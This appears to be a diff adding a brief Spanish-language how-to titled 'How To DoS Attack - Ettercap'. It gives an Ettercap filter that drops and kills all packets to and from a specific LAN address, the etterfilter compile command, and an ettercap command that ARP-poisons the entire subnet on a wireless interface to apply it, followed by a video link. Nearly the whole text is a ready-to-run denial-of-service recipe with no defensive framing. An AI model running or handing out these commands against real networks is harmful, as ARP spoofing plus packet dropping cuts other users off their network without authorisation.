@@ -1,0 +1,13 @@
+How To DoS Attack - Ettercap 
+
+1. guardo el codigo en un archivo con formato .elt 
+if (ip.src == '192.168.2.102' || ip.dst == '192.168.2.102')
+{
+drop();
+kill();
+msg('Atake DOS\n')
+}
+2. etterfilter dos.elt -e dos.ef 
+3. ettercap -i wlan0 -T -q -F dos.ef -M ARP ////
+
+https://www.youtube.com/watch?v=6YMb9-USD_0
